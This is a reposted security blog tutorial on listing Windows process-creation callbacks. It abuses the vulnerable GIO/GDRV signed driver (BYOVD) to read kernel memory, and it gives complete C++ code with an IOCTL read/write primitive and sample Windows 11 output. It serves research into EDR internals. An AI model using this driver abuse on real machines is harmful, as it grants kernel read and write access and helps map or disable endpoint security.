@@ -1,0 +1,904 @@
+# https://core-jmp.org/2026/04/enumerating-windows-process-creation-callbacks/
+
+<!DOCTYPE html><!--[if IE 9 ]>   <html class="no-js oldie ie9 ie" lang="en-US" > <![endif]--><!--[if (gt IE 9)|!(IE)]><!--><html class="js audio canvas fullscreen svg video cssanimations boxshadow csscolumns csscolumns-width csscolumns-span csscolumns-fill csscolumns-gap csscolumns-rule csscolumns-rulecolor csscolumns-rulestyle csscolumns-rulewidth csscolumns-breakbefore csscolumns-breakafter csscolumns-breakinside flexbox csscalc no-flexboxtweener cssgradients csstransforms supports csstransforms3d csstransitions objectfit object-fit cssclippathsvg cssclippathinset cssclippathcircle cssclippathellipse cssclippathpolygon" lang="en-US" style=""><!--<![endif]-->
+
+
+<body class="wp-singular post-template-default single single-post postid-2537 single-format-standard wp-custom-logo wp-theme-phlox phlox aux-boxed aux-resp aux-hd aux-page-animation-off aux-dom-ready" data-framed="">
+
+
+<div id="inner-body">
+
+    <!-- end header -->
+             <!-- end page header -->
+        
+    <main id="main" class="aux-main aux-territory  aux-single aux-boxed-container aux-content-top-margin right-sidebar aux-has-sidebar aux-sidebar-style-border aux-user-entry">
+        <div class="aux-wrapper">
+            <div class="aux-container aux-fold">
+
+                <div id="primary" class="aux-primary">
+                    <div class="content" role="main">
+
+                                                            <article class="aux-simple-context post-2537 post type-post status-publish format-standard has-post-thumbnail hentry category-byovd category-cpp category-edr category-ioctl category-kernel category-windows tag-byovd tag-c-2 tag-callback-enumeration tag-defensive-research tag-edr-internals tag-gdrv tag-gio-driver tag-ioctl tag-kernel-memory-read tag-kernel-security tag-ntquerysysteminformation tag-offensive-security tag-process-creation-callbacks tag-pspcreateprocessnotifyroutine tag-reverse-engineering tag-systemmoduleinformation tag-vulnerable-driver tag-windows-11 tag-windows-internals tag-windows-kernel">
+
+                                                                                        <div class="entry-media">
+                                                <div class="aux-media-frame aux-media-image aux-image-mask"><a href="https://core-jmp.org/2026/04/enumerating-windows-process-creation-callbacks/"><img width="300" height="300" src="https://core-jmp.org/wp-content/uploads/2026/04/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA-%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0-2026-04-24-%D0%B2-15.23.30-300x300.png" class="aux-attachment aux-featured-image attachment-300x300 aux-attachment-id-2538 " alt="Enumerating Windows Process Creation Callbacks" data-ratio="1" data-original-w="1084"></a></div>                                            </div>
+                                                                                        <div class="entry-main">
+
+                                                
+
+                                                                                                <div class="entry-info ">
+                                                                                                        <div class="entry-date"><time datetime="2026-04-24T13:29:47+00:00">April 24, 2026</time></div>
+                                                                                                        <div class="entry-author">
+                                                        <span class="meta-sep">by</span>
+                                                        <span class="author vcard">
+                                                            <a href="https://core-jmp.org/author/oxfemale/" rel="author" title="View all posts by oxfemale">
+                                                                oxfemale                                                            </a>
+                                                        </span>
+                                                    </div>
+                                                                                                        <div class="entry-comments">
+                                                        <span class="meta-sep">with</span>
+                                                        <span class="meta-comment">no comment</span>
+                                                    </div>
+                                                                                                        <div class="entry-tax">
+                                                                                                                <a href="https://core-jmp.org/security/byovd/" title="View all posts in BYOVD" rel="category">BYOVD</a><a href="https://core-jmp.org/security/cpp/" title="View all posts in cpp" rel="category">cpp</a><a href="https://core-jmp.org/security/edr/" title="View all posts in EDR" rel="category">EDR</a><a href="https://core-jmp.org/security/windows/ioctl/" title="View all posts in IOCTL" rel="category">IOCTL</a><a href="https://core-jmp.org/security/windows/kernel/" title="View all posts in kernel" rel="category">kernel</a><a href="https://core-jmp.org/security/windows/" title="View all posts in windows" rel="category">windows</a>                                                    </div>
+                                                                                                    </div>
+                                                
+                                                <div class="entry-content">
+                                                    <form method="get" action="https://core-jmp.org/wp-admin/admin-post.php" style="text-align:center; margin:10px 0;"><input type="image" src="https://core-jmp.org/wp-content/plugins/post-to-pdf-exporter/assets/image/pdf.png" alt="Download PDF" style="max-width:50px;"></form>
+<p><a href="https://medium.com/@s12deff/enumerating-windows-process-creation-callbacks-98e09153e2d7">Original text</a> by <a href="https://medium.com/@s12deff?source=post_page---byline--98e09153e2d7---------------------------------------">S12 – 0x12Dark Development</a></p>
+
+
+
+<p><em>The article explains how Windows process creation callbacks can be enumerated from user mode by abusing a vulnerable signed driver with a kernel memory read primitive. It focuses on&nbsp;<code>PspCreateProcessNotifyRoutine</code>, the kernel callback array used by security products, EDRs, and system drivers to receive notifications whenever a new process is created. The author outlines a five-step methodology: enumerate loaded kernel modules with&nbsp;<code>NtQuerySystemInformation(SystemModuleInformation)</code>, locate the&nbsp;<code>ntoskrnl.exe</code>&nbsp;base address, add the known offset of&nbsp;<code>PspCreateProcessNotifyRoutine</code>, use a BYOVD read primitive to read kernel memory, then walk the 64 callback slots and map each callback function address back to the driver that owns it. The implementation is shown in C++ and uses the GIO/GDRV vulnerable driver interface to read kernel memory via IOCTL. The PoC demonstrates output on Windows 11, identifying callbacks registered by drivers such as&nbsp;<code>WdFilter.sys</code>,&nbsp;<code>cng.sys</code>,&nbsp;<code>ksecdd.sys</code>,&nbsp;<code>tcpip.sys</code>, and others. The key idea is defensive and offensive visibility into which kernel drivers monitor process creation.&nbsp;</em></p>
+
+
+
+<p id="fd64">Welcome to this new post. Today we’re going to look at how Windows tracks which drivers get notified every time a new process is created, and how we can read that list from usermode</p>
+
+
+
+<p id="9c23">If you’ve ever wondered how EDRs know the moment a new process spawns, the answer lives in a kernel array called&nbsp;<code>PspCreateProcessNotifyRoutine</code>. Every security driver that wants to monitor process creation registers a callback there, and the kernel calls them all when a new process starts.</p>
+
+
+
+<p id="33e6">In this post we’ll walk through enumerating that array using a vulnerable driver to get read primitives into kernel memory. No kernel debugging, no custom drivet, just a BYOVD with kernel read primitive.</p>
+
+
+
+<figure class="wp-block-image size-full"><img decoding="async" width="1084" height="757" src="https://core-jmp.org/wp-content/uploads/2026/04/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA-%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0-2026-04-24-%D0%B2-15.23.30.png" alt="" class="wp-image-2538"></figure>
+
+
+
+<h2 class="wp-block-heading" id="d0d3">Methodology</h2>
+
+
+
+<p id="4a63">To enumerate all process creation callbacks registered in the Windows kernel, we need to follow these steps:</p>
+
+
+
+<ol class="wp-block-list">
+<li><strong>List Loaded Kernel Drivers</strong>: First, we need to get the base address of&nbsp;<code>ntoskrnl.exe</code>&nbsp;in memory. We use&nbsp;<code>NtQuerySystemInformation</code>&nbsp;with&nbsp;<code>SystemModuleInformation</code>&nbsp;to get a list of all loaded kernel modules and their base addresses. This is crucial because all the offsets we work with later are relative to this base.</li>
+
+
+
+<li><strong>Locate the Callback Array</strong>: Once we have the base address of&nbsp;<code>ntoskrnl.exe</code>, we add the known offset of&nbsp;<code>PspCreateProcessNotifyRoutine</code>to get the exact address of the array in kernel memory. This offset can be found using a kernel debugger like WinDbg</li>
+
+
+
+<li><strong>Open a Read Primitive</strong>: To read kernel memory from user-mode, we use a vulnerable driver (BYOVD) that exposes a read primitive via IOCTL. This lets us read arbitrary kernel memory addresses from a regular user-mode process</li>
+
+
+
+<li><strong>Walk the Array</strong>: With our read primitive, we iterate over the 64 slots of the array. For each non-null slot, we decode the pointer (the kernel stores it with some flag bits set) and perform a second read to dereference the&nbsp;<code>EX_CALLBACK</code>&nbsp;struct and get the actual callback function address</li>
+
+
+
+<li><strong>Identify the Driver</strong>: Finally, we compare each callback address against our list of loaded drivers to identify which driver registered each callback</li>
+</ol>
+
+
+
+<pre class="wp-block-code"><code class="hljs cs">ntoskrnl <span class="hljs-keyword">base</span> + offset
+        ↓
+PspCreateProcessNotifyRoutine[<span class="hljs-number">0.</span><span class="hljs-number">.63</span>]
+        ↓  (<span class="hljs-number">1</span>st read + decode)
+EX_CALLBACK <span class="hljs-keyword">struct</span>
+        ↓  (<span class="hljs-number">2</span>nd read)
+Callback function address  →  Driver name</code></pre>
+
+
+
+<h2 class="wp-block-heading" id="bca7">Implementation</h2>
+
+
+
+<p id="a2cd">Now, let’s look at how to translate that logic into C++ code. I have broken down the most important parts.</p>
+
+
+
+<h3 class="wp-block-heading" id="8dc0">Listing Kernel Drivers</h3>
+
+
+
+<p id="0c73">We call&nbsp;<code>NtQuerySystemInformation</code>&nbsp;with class&nbsp;<code>11</code>&nbsp;(<code>SystemModuleInformation</code>) to get all loaded kernel modules. We store each driver’s name, base address and size in a vector, which we’ll use later to identify which driver owns each callback</p>
+
+
+
+<pre class="wp-block-code has-small-font-size"><code class="hljs php">std::vector&lt;KernelDriver&gt; GetSortedKernelDrivers() {
+    auto NtQuerySystemInformation = (pNtQuerySystemInformation)GetProcAddress(
+        GetModuleHandleA(<span class="hljs-string">"ntdll.dll"</span>), <span class="hljs-string">"NtQuerySystemInformation"</span>);
+
+    ULONG len = <span class="hljs-number">0</span>;
+    NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)<span class="hljs-number">11</span>, <span class="hljs-keyword">NULL</span>, <span class="hljs-number">0</span>, &amp;len);
+
+    std::vector&lt;BYTE&gt; buffer(len);
+    NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)<span class="hljs-number">11</span>, buffer.data(), len, &amp;len);
+
+    auto mods = reinterpret_cast&lt;PSYSTEM_MODULE_INFORMATION&gt;(buffer.data());
+    <span class="hljs-keyword">for</span> (ULONG i = <span class="hljs-number">0</span>; i &lt; mods-&gt;Count; i++) {
+        KernelDriver drv;
+        drv.BaseAddress = reinterpret_cast&lt;uintptr_t&gt;(mods-&gt;Modules[i].ImageBase);
+        drv.Size = mods-&gt;Modules[i].ImageSize;
+        drv.Name = std::string(reinterpret_cast&lt;<span class="hljs-keyword">const</span> char*&gt;(mods-&gt;Modules[i].FullPathName) 
+                               + mods-&gt;Modules[i].OffsetToFileName);
+        driverList.push_back(drv);
+    }
+}</code></pre>
+
+
+
+<h3 class="wp-block-heading" id="01a3">Getting the Array Address</h3>
+
+
+
+<p id="3cbf">We find&nbsp;<code>ntoskrnl.exe</code>&nbsp;in our driver list and add the hardcoded offset to get the exact kernel address of&nbsp;<code>PspCreateProcessNotifyRoutine</code>. The offset can be obtained with WinDbg:</p>
+
+
+
+<pre class="wp-block-code"><code class="hljs">lkd&gt; ? nt!PspCreateProcessNotifyRoutine - nt
+Evaluate expression: 15750464 = 00000000`00f05540</code></pre>
+
+
+
+<p>DWORD64 arrayBase = ntBase + 0xf05540;</p>
+
+
+
+<h3 class="wp-block-heading" id="b5ea"><strong>Opening the Read Primitive</strong></h3>
+
+
+
+<p id="5da9">We open a handle to the vulnerable driver (in this case GIO/GDRV) which exposes a kernel read primitive via IOCTL. This lets us read arbitrary kernel memory from usermode</p>
+
+
+
+<pre class="wp-block-code"><code class="hljs java">HANDLE drv = CreateFileA(<span class="hljs-string">"\\\\.\\GIO"</span>, GENERIC_READ | GENERIC_WRITE, 
+       <span class="hljs-number">0</span>, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);</code></pre>
+
+
+
+<h3 class="wp-block-heading" id="f62e">Walking the Array</h3>
+
+
+
+<p id="1fe4">This is where everything comes together. We iterate the 64 slots, do two reads per entry, and match the result against our driver list</p>
+
+
+
+<pre class="wp-block-code has-small-font-size"><code class="hljs cs"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">64</span>; i++) {
+    DWORD64 callback = <span class="hljs-number">0</span>;
+    ReadPrimitive(drv, &amp;callback, (LPVOID)(uintptr_t)(arrayBase + (i * <span class="hljs-number">8</span>)), <span class="hljs-keyword">sizeof</span>(DWORD64));
+
+    <span class="hljs-keyword">if</span> (callback == NULL) <span class="hljs-keyword">continue</span>;
+
+    <span class="hljs-comment">// Decode the pointer, kernel stores it with flag bits set</span>
+    DWORD64 decoded = callback &amp; ~((<span class="hljs-number">1</span>ULL &lt;&lt; <span class="hljs-number">3</span>) + <span class="hljs-number">0x1</span>);
+
+    <span class="hljs-comment">// Second read, dereference the EX_CALLBACK struct to get the actual function</span>
+    DWORD64 cbFunction = <span class="hljs-number">0</span>;
+    ReadPrimitive(drv, &amp;cbFunction, (LPVOID)(uintptr_t)decoded, <span class="hljs-keyword">sizeof</span>(DWORD64));
+    cbFunction = <span class="hljs-number">0xffff000000000000</span>ULL | (cbFunction &gt;&gt; <span class="hljs-number">16</span>); <span class="hljs-comment">// fix byte order</span>
+
+    <span class="hljs-comment">// Match against loaded drivers</span>
+    <span class="hljs-keyword">for</span> (auto&amp; kdrv : drivers) {
+        <span class="hljs-keyword">if</span> (cbFunction &gt;= kdrv.BaseAddress &amp;&amp; cbFunction &lt; kdrv.BaseAddress + kdrv.Size) {
+            cout &lt;&lt; <span class="hljs-string">"["</span> &lt;&lt; i &lt;&lt; <span class="hljs-string">"] "</span> &lt;&lt; kdrv.Name &lt;&lt; <span class="hljs-string">" -&gt; 0x"</span> &lt;&lt; hex &lt;&lt; cbFunction &lt;&lt; endl;
+            <span class="hljs-keyword">break</span>;
+        }
+    }
+}</code></pre>
+
+
+
+<p id="0506">Note that the byte order fix (<code>0xffff000000000000 | value &gt;&gt; 16</code>) is specific to how this particular driver returns data, yours may behave differently depending on which vulnerable driver you use.</p>
+
+
+
+<h2 class="wp-block-heading" id="b77e">Code</h2>
+
+
+
+<p id="81de"><strong>main.cpp</strong></p>
+
+
+
+<pre class="wp-block-code has-small-font-size"><code class="hljs php"><span class="hljs-comment">#include &lt;iostream&gt;</span>
+<span class="hljs-comment">#include &lt;Windows.h&gt;</span>
+<span class="hljs-comment">#include &lt;winternl.h&gt;</span>
+<span class="hljs-comment">#include &lt;vector&gt;</span>
+<span class="hljs-comment">#include &lt;algorithm&gt;</span>
+<span class="hljs-comment">#include "DriverOps.h"</span>
+
+using <span class="hljs-keyword">namespace</span> <span class="hljs-title">std</span>;
+
+typedef struct _SYSTEM_MODULE_ENTRY {
+    HANDLE Section;
+    PVOID MappedBase;
+    PVOID ImageBase;
+    ULONG ImageSize;
+    ULONG Flags;
+    USHORT LoadOrderIndex;
+    USHORT InitOrderIndex;
+    USHORT LoadCount;
+    USHORT OffsetToFileName;
+    UCHAR FullPathName[<span class="hljs-number">256</span>];
+} SYSTEM_MODULE_ENTRY, * PSYSTEM_MODULE_ENTRY;
+
+typedef struct _SYSTEM_MODULE_INFORMATION {
+    ULONG Count;
+    SYSTEM_MODULE_ENTRY Modules[<span class="hljs-number">1</span>];
+} SYSTEM_MODULE_INFORMATION, * PSYSTEM_MODULE_INFORMATION;
+
+struct KernelDriver {
+    std::string Name;
+    uintptr_t BaseAddress;
+    uint32_t Size;
+};
+
+typedef NTSTATUS(NTAPI* pNtQuerySystemInformation)(
+    SYSTEM_INFORMATION_CLASS SystemInformationClass,
+    PVOID SystemInformation,
+    ULONG SystemInformationLength,
+    PULONG ReturnLength
+    );
+
+
+struct offsets {
+    ULONG64 PspCallProcessNotifyRoutine;
+} g_offsets = {
+    <span class="hljs-number">0xf05540</span>, <span class="hljs-comment">// (? fffff801`eb705540 - fffff801`ea800000) = (? ntstartaddress - fffff801`eb705540 nt!PspCreateProcessNotifyRoutine = &lt;no type information&gt;)</span>
+};
+
+<span class="hljs-comment">/*
+    1- List all drivers
+    2- Get nsoskrnl.exe base address
+    3- Get PspCallProcessNotifyRoutine offset from ntoskrnl.exe 
+    4- Read current callback array
+    5- Read the current function of each array callback element
+*/</span>
+
+std::vector&lt;KernelDriver&gt; GetSortedKernelDrivers() {
+    std::vector&lt;KernelDriver&gt; driverList;
+
+    auto NtQuerySystemInformation = (pNtQuerySystemInformation)GetProcAddress(
+        GetModuleHandleA(<span class="hljs-string">"ntdll.dll"</span>), <span class="hljs-string">"NtQuerySystemInformation"</span>);
+
+    <span class="hljs-keyword">if</span> (!NtQuerySystemInformation) <span class="hljs-keyword">return</span> driverList;
+
+    ULONG len = <span class="hljs-number">0</span>;
+    <span class="hljs-keyword">const</span> int SystemModuleInformation = <span class="hljs-number">11</span>;
+
+    NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemModuleInformation, <span class="hljs-keyword">NULL</span>, <span class="hljs-number">0</span>, &amp;len);
+
+    std::vector&lt;BYTE&gt; buffer(len);
+    NTSTATUS status = NtQuerySystemInformation(
+        (SYSTEM_INFORMATION_CLASS)SystemModuleInformation,
+        buffer.data(),
+        len,
+        &amp;len
+    );
+
+    <span class="hljs-keyword">if</span> (status != <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> driverList; <span class="hljs-comment">// STATUS_SUCCESS = 0</span>
+
+    auto mods = reinterpret_cast&lt;PSYSTEM_MODULE_INFORMATION&gt;(buffer.data());
+
+    <span class="hljs-keyword">for</span> (ULONG i = <span class="hljs-number">0</span>; i &lt; mods-&gt;Count; i++) {
+        SYSTEM_MODULE_ENTRY&amp; entry = mods-&gt;Modules[i];
+
+        KernelDriver drv;
+        drv.BaseAddress = reinterpret_cast&lt;uintptr_t&gt;(entry.ImageBase);
+        drv.Size = entry.ImageSize;
+
+        <span class="hljs-keyword">const</span> char* nameStart = reinterpret_cast&lt;<span class="hljs-keyword">const</span> char*&gt;(entry.FullPathName) + entry.OffsetToFileName;
+        drv.Name = std::string(nameStart);
+
+        driverList.push_back(drv);
+    }
+
+    std::sort(driverList.begin(), driverList.end(), [](<span class="hljs-keyword">const</span> KernelDriver&amp; a, <span class="hljs-keyword">const</span> KernelDriver&amp; b) {
+        <span class="hljs-keyword">return</span> a.BaseAddress &lt; b.BaseAddress;
+        });
+
+    <span class="hljs-keyword">return</span> driverList;
+}
+
+DWORD64 GetNtoskrnlBase(<span class="hljs-keyword">const</span> std::vector&lt;KernelDriver&gt;&amp; drivers) {
+    <span class="hljs-keyword">if</span> (drivers.<span class="hljs-keyword">empty</span>()) {
+        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+    }
+
+    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> auto&amp; drv : drivers) {
+        std::string nameLower = drv.Name;
+        std::transform(nameLower.begin(), nameLower.end(), nameLower.begin(), ::tolower);
+
+        <span class="hljs-keyword">if</span> (nameLower.find(<span class="hljs-string">"ntoskrnl.exe"</span>) != std::string::npos ||
+            nameLower.find(<span class="hljs-string">"ntkrnl"</span>) != std::string::npos) {
+            <span class="hljs-keyword">return</span> (DWORD64)drv.BaseAddress;
+        }
+    }
+
+    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+}
+
+
+BOOL EnableSeDebugPrivilege(){
+    HANDLE hToken;
+    TOKEN_PRIVILEGES tp;
+    LUID luid;
+    <span class="hljs-keyword">if</span> (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &amp;hToken))
+    {
+        std::cerr &lt;&lt; <span class="hljs-string">"OpenProcessToken failed: "</span> &lt;&lt; GetLastError() &lt;&lt; std::endl;
+        <span class="hljs-keyword">return</span> <span class="hljs-keyword">FALSE</span>;
+    }
+    <span class="hljs-keyword">if</span> (!LookupPrivilegeValue(<span class="hljs-keyword">NULL</span>, SE_DEBUG_NAME, &amp;luid))
+    {
+        std::cerr &lt;&lt; <span class="hljs-string">"LookupPrivilegeValue failed: "</span> &lt;&lt; GetLastError() &lt;&lt; std::endl;
+        CloseHandle(hToken);
+        <span class="hljs-keyword">return</span> <span class="hljs-keyword">FALSE</span>;
+    }
+    tp.PrivilegeCount = <span class="hljs-number">1</span>;
+    tp.Privileges[<span class="hljs-number">0</span>].Luid = luid;
+    tp.Privileges[<span class="hljs-number">0</span>].Attributes = SE_PRIVILEGE_ENABLED;
+    <span class="hljs-keyword">if</span> (!AdjustTokenPrivileges(hToken, <span class="hljs-keyword">FALSE</span>, &amp;tp, sizeof(TOKEN_PRIVILEGES), <span class="hljs-keyword">NULL</span>, <span class="hljs-keyword">NULL</span>))
+    {
+        std::cerr &lt;&lt; <span class="hljs-string">"AdjustTokenPrivileges failed: "</span> &lt;&lt; GetLastError() &lt;&lt; std::endl;
+        CloseHandle(hToken);
+        <span class="hljs-keyword">return</span> <span class="hljs-keyword">FALSE</span>;
+    }
+    CloseHandle(hToken);
+    <span class="hljs-keyword">return</span> <span class="hljs-keyword">TRUE</span>;
+}
+
+DWORD64 FixByteOrder(DWORD64 value) {
+    <span class="hljs-comment">// Rotar 2 bytes (16 bits) a la derecha y rellenar 0xffff arriba</span>
+    <span class="hljs-keyword">return</span> <span class="hljs-number">0xffff000000000000</span>ULL | (value &gt;&gt; <span class="hljs-number">16</span>);
+}
+
+int main(){
+    BOOL setPriv = EnableSeDebugPrivilege();
+
+    cout &lt;&lt; <span class="hljs-string">"[+] Enumerating EDR Callbacks on Process Creation"</span> &lt;&lt; endl;
+    vector&lt;KernelDriver&gt; drivers = GetSortedKernelDrivers();
+    DWORD64 ntBase = GetNtoskrnlBase(drivers);
+    DWORD64 arrayBase = ntBase + g_offsets.PspCallProcessNotifyRoutine;
+
+    <span class="hljs-comment">//cout &lt;&lt; "[+] aaaaa  " &lt;&lt; hex &lt;&lt; drivers[21].BaseAddress &lt;&lt; endl;</span>
+    HANDLE drv = openVulnDriver();
+    cout &lt;&lt; <span class="hljs-string">"[+] PspCreateProcessNotifyRoutine array at: "</span> &lt;&lt; hex &lt;&lt; arrayBase &lt;&lt; endl;
+    
+    
+    <span class="hljs-keyword">for</span> (int i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">64</span>; i++) {
+        DWORD64 callback = <span class="hljs-number">0</span>;
+
+        BOOL r = ReadPrimitive(drv, &amp;callback, (LPVOID)(uintptr_t)(arrayBase + (i * <span class="hljs-number">8</span>)), sizeof(DWORD64));
+        <span class="hljs-keyword">if</span> (!r) {
+            cout &lt;&lt; <span class="hljs-string">"[!] Failed at slot "</span> &lt;&lt; i &lt;&lt; endl;
+            <span class="hljs-keyword">break</span>;
+        }
+
+        <span class="hljs-keyword">if</span> (callback == <span class="hljs-keyword">NULL</span>) <span class="hljs-keyword">continue</span>;
+
+        cout &lt;&lt; <span class="hljs-string">"["</span> &lt;&lt; i &lt;&lt; <span class="hljs-string">"] raw: 0x"</span> &lt;&lt; hex &lt;&lt; callback &lt;&lt; endl;
+
+        DWORD64 decoded = callback &amp; ~((<span class="hljs-number">1</span>ULL &lt;&lt; <span class="hljs-number">3</span>) + <span class="hljs-number">0x1</span>);
+        cout &lt;&lt; <span class="hljs-string">"["</span> &lt;&lt; i &lt;&lt; <span class="hljs-string">"] decoded: 0x"</span> &lt;&lt; hex &lt;&lt; decoded &lt;&lt; endl;
+
+        DWORD64 cbFunction = <span class="hljs-number">0</span>;
+        ReadPrimitive(drv, &amp;cbFunction, (LPVOID)(uintptr_t)decoded, sizeof(DWORD64));
+        cbFunction = FixByteOrder(cbFunction);
+        cout &lt;&lt; <span class="hljs-string">"["</span> &lt;&lt; i &lt;&lt; <span class="hljs-string">"] cbFunction: 0x"</span> &lt;&lt; hex &lt;&lt; cbFunction &lt;&lt; endl;
+
+        <span class="hljs-keyword">for</span> (auto&amp; kdrv : drivers) {
+            <span class="hljs-keyword">if</span> (cbFunction &gt;= kdrv.BaseAddress &amp;&amp;
+                cbFunction &lt; (kdrv.BaseAddress + kdrv.Size)) {
+                cout &lt;&lt; <span class="hljs-string">"    -&gt; "</span> &lt;&lt; kdrv.Name &lt;&lt; endl;
+                <span class="hljs-keyword">break</span>;
+            }
+        }
+    }
+
+}</code></pre>
+
+
+
+<p><strong>DriverOps.h</strong></p>
+
+
+
+<pre class="wp-block-code has-small-font-size"><code class="hljs cs"><span class="hljs-meta">#include &lt;iostream&gt;</span>
+<span class="hljs-meta">#include &lt;Windows.h&gt;</span>
+
+<span class="hljs-comment">// https://www.loldrivers.io/drivers/2bea1bca-753c-4f09-bc9f-566ab0193f4a/</span>
+
+<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> IOCTL_READWRITE_PRIMITIVE 0xC3502808</span>
+
+<span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-title">std</span>;
+
+typedef <span class="hljs-keyword">struct</span> KernelWritePrimitive {
+ LPVOID dst;
+ LPVOID src;
+ DWORD size;
+} KernelWritePrimitive;
+
+typedef <span class="hljs-keyword">struct</span> KernelReadPrimitive {
+ LPVOID dst;
+ LPVOID src;
+ DWORD size;
+} KernelReadPrimitive;
+
+<span class="hljs-function">BOOL <span class="hljs-title">WritePrimitive</span>(<span class="hljs-params">HANDLE driver, LPVOID dst, LPVOID src, DWORD size</span>) </span>{
+ KernelWritePrimitive kwp;
+ kwp.dst = dst;
+ kwp.src = src;
+ kwp.size = size;
+
+ BYTE bufferReturned[<span class="hljs-number">48</span>] = { <span class="hljs-number">0</span> };
+ DWORD returned = <span class="hljs-number">0</span>;
+ BOOL result = DeviceIoControl(driver, IOCTL_READWRITE_PRIMITIVE, (LPVOID)&amp;kwp, <span class="hljs-keyword">sizeof</span>(kwp), (LPVOID)bufferReturned, <span class="hljs-keyword">sizeof</span>(bufferReturned), &amp;returned, nullptr);
+ <span class="hljs-keyword">if</span> (!result) {
+  cout &lt;&lt; <span class="hljs-string">"Failed to send write primitive. Error code: "</span> &lt;&lt; GetLastError() &lt;&lt; endl;
+  <span class="hljs-keyword">return</span> FALSE;
+ }
+ cout &lt;&lt; <span class="hljs-string">"Write primitive sent successfully. Bytes returned: "</span> &lt;&lt; returned &lt;&lt; endl;
+ <span class="hljs-keyword">return</span> TRUE;
+}
+
+<span class="hljs-function">BOOL <span class="hljs-title">ReadPrimitive</span>(<span class="hljs-params">HANDLE driver, LPVOID dst, LPVOID src, DWORD size</span>) </span>{
+ KernelReadPrimitive krp;
+ krp.dst = dst;
+ krp.src = src;
+ krp.size = size;
+
+
+ DWORD returned = <span class="hljs-number">0</span>;
+
+ BOOL result = DeviceIoControl(driver, IOCTL_READWRITE_PRIMITIVE, (LPVOID)&amp;krp, <span class="hljs-keyword">sizeof</span>(krp), (LPVOID)dst, size, &amp;returned, nullptr);
+ <span class="hljs-keyword">if</span> (!result) {
+  cout &lt;&lt; <span class="hljs-string">"Failed to send read primitive. Error code: "</span> &lt;&lt; GetLastError() &lt;&lt; endl;
+  <span class="hljs-keyword">return</span> FALSE;
+ }
+ cout &lt;&lt; <span class="hljs-string">"Read primitive sent successfully. Bytes returned: "</span> &lt;&lt; returned &lt;&lt; endl;
+ <span class="hljs-keyword">return</span> TRUE;
+}
+
+
+<span class="hljs-function">HANDLE <span class="hljs-title">openVulnDriver</span>(<span class="hljs-params"></span>) </span>{
+ HANDLE driver = CreateFileA(<span class="hljs-string">"\\\\.\\GIO"</span>, GENERIC_READ | GENERIC_WRITE, <span class="hljs-number">0</span>, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
+ <span class="hljs-keyword">if</span> (!driver || driver == INVALID_HANDLE_VALUE)
+ {
+  cout &lt;&lt; <span class="hljs-string">"Failed to open handle to driver. Error code: "</span> &lt;&lt; GetLastError() &lt;&lt; endl;
+  <span class="hljs-keyword">return</span> NULL;
+ }
+ <span class="hljs-keyword">return</span> driver;
+}</code></pre>
+
+
+
+<h2 class="wp-block-heading" id="1a32">Proof of Concept</h2>
+
+
+
+<p id="245b"><strong>Windows 11:</strong></p>
+
+
+
+<p>We run the compiled code as&nbsp;<strong>administrator:</strong></p>
+
+
+
+<pre class="wp-block-code has-small-font-size"><code class="hljs css"><span class="hljs-selector-tag">C</span>:\<span class="hljs-selector-tag">Windows</span>\<span class="hljs-selector-tag">System32</span>&gt;<span class="hljs-selector-tag">C</span>:\<span class="hljs-selector-tag">Users</span>\<span class="hljs-selector-tag">s12de</span>\<span class="hljs-selector-tag">Documents</span>\<span class="hljs-selector-tag">Github</span>\<span class="hljs-selector-tag">byovds</span>\<span class="hljs-selector-tag">FromRW_BYOVDto</span>\<span class="hljs-selector-tag">SilencingPspCallProcessNotifyRoutine</span>\<span class="hljs-selector-tag">x64</span>\<span class="hljs-selector-tag">Debug</span>\<span class="hljs-selector-tag">SilencingPspCallProcessNotifyRoutine</span><span class="hljs-selector-class">.exe</span>
+<span class="hljs-selector-attr">[+]</span> <span class="hljs-selector-tag">Enumerating</span> <span class="hljs-selector-tag">EDR</span> <span class="hljs-selector-tag">Callbacks</span> <span class="hljs-selector-tag">on</span> <span class="hljs-selector-tag">Process</span> <span class="hljs-selector-tag">Creation</span>
+<span class="hljs-selector-attr">[+]</span> <span class="hljs-selector-tag">PspCreateProcessNotifyRoutine</span> <span class="hljs-selector-tag">array</span> <span class="hljs-selector-tag">at</span>: <span class="hljs-selector-tag">fffff8007f305540</span>
+<span class="hljs-selector-tag">Read</span> <span class="hljs-selector-tag">primitive</span> <span class="hljs-selector-tag">sent</span> <span class="hljs-selector-tag">successfully</span>. <span class="hljs-selector-tag">Bytes</span> <span class="hljs-selector-tag">returned</span>: 0
+<span class="hljs-selector-attr">[0]</span> <span class="hljs-selector-tag">raw</span>: 0<span class="hljs-selector-tag">xffffc28f3966873f</span>
+<span class="hljs-selector-attr">[0]</span> <span class="hljs-selector-tag">decoded</span>: 0<span class="hljs-selector-tag">xffffc28f39668736</span>
+<span class="hljs-selector-tag">Read</span> <span class="hljs-selector-tag">primitive</span> <span class="hljs-selector-tag">sent</span> <span class="hljs-selector-tag">successfully</span>. <span class="hljs-selector-tag">Bytes</span> <span class="hljs-selector-tag">returned</span>: 0
+<span class="hljs-selector-attr">[0]</span> <span class="hljs-selector-tag">cbFunction</span>: 0<span class="hljs-selector-tag">xfffff8000fd7a4a0</span>
+    <span class="hljs-selector-tag">-</span>&gt; <span class="hljs-selector-tag">cng</span><span class="hljs-selector-class">.sys</span>
